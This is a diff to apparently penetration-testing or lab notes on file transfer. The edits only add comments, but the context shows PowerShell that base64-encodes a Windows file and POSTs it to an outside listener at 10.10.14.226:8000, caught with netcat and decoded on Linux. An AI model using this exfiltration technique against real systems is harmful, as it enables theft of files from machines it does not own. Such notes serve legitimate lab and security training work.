@@ -82,6 +82,7 @@ sudo python3 -m pyftpdlib --port 21
 ### Base64
 
 ```powershell
+# from window
 [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 # verify
 Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
@@ -92,15 +93,17 @@ md5sum hosts
 ```
 
 ```powershell
+# from window
 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 
 Invoke-WebRequest -Uri http://10.10.14.226:8000/ -Method POST -Body $b64
 
-# from linux
+# to linux
 nc -lvnp 8000
 # decode
 echo <base64> | base64 -d -w 0 > hosts
 ```
+
 ### PowerShell
 
 [GitHub - uploadserver](https://github.com/Densaugeo/uploadserver)
